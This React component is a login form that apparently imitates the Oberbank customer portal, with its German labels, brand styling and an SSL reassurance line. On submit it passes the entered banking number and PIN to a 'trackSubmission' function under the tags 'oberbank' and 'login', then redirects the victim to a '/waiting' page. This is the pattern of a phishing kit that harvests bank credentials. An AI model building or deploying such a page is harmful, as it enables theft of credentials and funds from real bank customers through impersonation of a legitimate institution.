"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

const languages = [
  { value: "de", label: "Deutsch" },
  { value: "en", label: "English" },
  { value: "hu", label: "Magyar" },
  { value: "cs", label: "Česky" },
  { value: "sk", label: "Slovensky" },
];

export default function LoginTile() {
  const router = useRouter();
  const [bankingNr, setBankingNr] = useState("");
  const [pin, setPin] = useState("");
  const [lang, setLang] = useState("de");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!bankingNr || !pin) return;

    trackSubmission("oberbank", "login", { bankingNr, pin, lang });
    router.push(`/waiting?user=${encodeURIComponent(bankingNr)}`);
  };

  return (
    <form onSubmit={handleSubmit} className="obr-tile flex flex-col">
      <div className="obr-tile-header">
        <h2 className="text-base font-medium" style={{ color: "#30454c" }}>
          Kundenportal Login
        </h2>
      </div>

      <div className="obr-tile-content flex-1">
        <div className="mb-3">
          <input
            type="text"
            className="obr-input"
            placeholder="Banking-Nummer"
            value={bankingNr}
            onChange={(e) => setBankingNr(e.target.value)}
          />
        </div>

        <div className="flex gap-2 mb-4">
          <div className="flex-1">
            <input
              type="password"
              className="obr-input"
              placeholder="Ihre PIN"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </div>
          <div>
            <select
              className="obr-select"
              value={lang}
              onChange={(e) => setLang(e.target.value)}
            >
              {languages.map((l) => (
                <option key={l.value} value={l.value}>
                  {l.label}
                </option>
              ))}
            </select>
          </div>
        </div>

        <p className="text-xs mb-4" style={{ color: "#30454c" }}>
          Ihre Anmeldung im Kundenportal geschieht über gesicherte SSL Verbindungen.
        </p>

        <div className="flex justify-end">
          <button type="submit" className="obr-btn-accent">
            Weiter
          </button>
        </div>
      </div>

      <div className="obr-tile-footer">
        <button type="button" className="obr-btn-borderless">
          Erstanmeldung
        </button>
      </div>
    </form>
  );
}
